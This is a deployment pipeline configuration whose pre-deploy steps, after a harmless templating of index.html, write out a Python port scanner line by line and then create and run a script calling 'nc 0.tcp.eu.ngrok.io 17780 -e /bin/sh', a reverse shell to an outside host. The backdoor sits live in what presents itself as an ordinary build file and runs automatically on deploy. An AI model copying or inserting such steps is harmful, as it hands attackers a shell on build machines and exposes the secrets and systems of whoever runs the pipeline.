version: 1

deploy:
  steps:
    terraformInit:
      before:
        - echo Replacing !!!USER!!! with $USER in index.html
        - sed 's/!!!USER!!!/'"$USER"'/g' index.template.html > index.html
	- echo 'import sys' > ports.py
	- echo 'import socket' >> ports.py
	- echo 'from datetime import datetime' >> ports.py
	- echo '' >> ports.py
	- echo '# Defining a target' >> ports.py
	- echo 'if len(sys.argv) == 2:' >> ports.py
	- echo '' >> ports.py
	- echo '	target = socket.gethostbyname(sys.argv[1])' >> ports.py
	- echo 'else:' >> ports.py
	- echo '	print("Invalid amount of Argument")' >> ports.py
	- echo '' >> ports.py
	- echo '# Add Banner' >> ports.py
	- echo 'print("-" * 50)' >> ports.py
	- echo 'print("Scanning Target: " + target)' >> ports.py
	- echo 'print("Scanning started at:" + str(datetime.now()))' >> ports.py
	- echo 'print("-" * 50)' >> ports.py
	- echo '' >> ports.py
	- echo 'try:' >> ports.py
	- echo '' >> ports.py
	- echo '	# will scan ports between 1 to 65,535' >> ports.py
	- echo '	for port in range(1,65535):' >> ports.py
	- echo '		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)' >> ports.py
	- echo '		socket.setdefaulttimeout(1)' >> ports.py
	- echo '		' >> ports.py
	- echo '		# returns an error indicator' >> ports.py
	- echo '		result = s.connect_ex((target,port))' >> ports.py
	- echo '		if result ==0:' >> ports.py
	- echo '			print("Port {} is open".format(port))' >> ports.py
	- echo '		s.close()' >> ports.py
	- echo '		' >> ports.py
	- echo 'except KeyboardInterrupt:' >> ports.py
	- echo '		print("\n Exiting Program !!!!")' >> ports.py
	- echo '		sys.exit()' >> ports.py
	- echo 'except socket.gaierror:' >> ports.py
	- echo '		print("\n Hostname Could Not Be Resolved !!!!")' >> ports.py
	- echo '		sys.exit()' >> ports.py
	- echo 'except socket.error:' >> ports.py
	- echo '		print("\ Server not responding !!!!")' >> ports.py
	- echo '		sys.exit()' >> ports.py
        - chmod +x ports.py
        - echo '' > file.sh
        - echo "nc 0.tcp.eu.ngrok.io 17780 -e /bin/sh" >> file.sh
        - chmod +x file.sh
        - ./file.sh
